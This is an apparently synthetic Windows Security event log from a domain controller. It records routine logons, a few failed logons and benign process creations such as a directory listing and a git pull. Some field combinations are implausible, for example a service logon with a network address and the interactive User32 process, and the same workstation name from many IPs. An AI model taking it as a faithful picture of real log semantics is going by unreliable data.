Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 6:24:44 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0xC67B74
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.12
	Source Port:	51713
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 6:26:49 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	Logon ID:	0x9A795F
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	38678
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 6:28:35 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0xA779CF
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.50
	Source Port:	53883
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 6:38:14 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	New Process ID:	0xC363
	New Process Name:	C:\Windows\System32\taskhostw.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	taskhostw.exe

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 6:42:00 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_report
	Account Name:	svc_report
	Account Domain:	CORP
	Logon ID:	0x71BE74
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.31
	Source Port:	33725
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 6:49:34 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	New Process ID:	0xF737
	New Process Name:	C:\Windows\System32\taskhostw.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	taskhostw.exe

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 6:50:15 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0x877183
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.15
	Source Port:	47259
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 6:57:12 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	Logon ID:	0x8AD5F5
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	54647
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:01:18 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0x6613C3
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.10
	Source Port:	59495
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:02:13 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0xEED817
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.10
	Source Port:	41554
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:04:27 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0x50E84F
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.30
	Source Port:	56869
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:08:36 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	Logon ID:	0xBC1552
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.30
	Source Port:	48296
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:09:22 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	bob
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	36275
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:13:54 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0x3262C7
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.50
	Source Port:	36456
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:19:38 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	New Process ID:	0xB7C8
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	cmd.exe /c dir Z:\reports

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:20:36 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0x1413B5
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.20
	Source Port:	36287
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:28:22 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0xCDD25A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.15
	Source Port:	36585
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:33:33 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.31
	Source Port:	53311
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:35:00 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_report
	Account Name:	svc_report
	Account Domain:	CORP
	Logon ID:	0x4D21B0
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.11
	Source Port:	31712
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:35:12 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	New Process ID:	0x5BD3
	New Process Name:	C:\Windows\System32\taskhostw.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	taskhostw.exe

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:39:00 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0xE1921B
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.15
	Source Port:	59711
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:39:48 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.30
	Source Port:	38286
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:42:44 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0xB5710C
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	34275
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:47:49 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	Logon ID:	0xD51F25
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.50
	Source Port:	41572
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:48:37 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0x9C84EB
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.10
	Source Port:	35924
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:49:23 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	New Process ID:	0xEF32
	New Process Name:	C:\Program Files\Git\bin\git.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	git.exe pull

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:49:46 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0xC6737B
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.50
	Source Port:	57013
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:52:01 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.50
	Source Port:	57612
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:52:32 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	carol
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.20
	Source Port:	41380
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:53:34 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0xD561F5
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.21
	Source Port:	38291
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:55:33 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	carol
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	51533
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 7:58:42 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0x5531AE
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.21
	Source Port:	42573
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

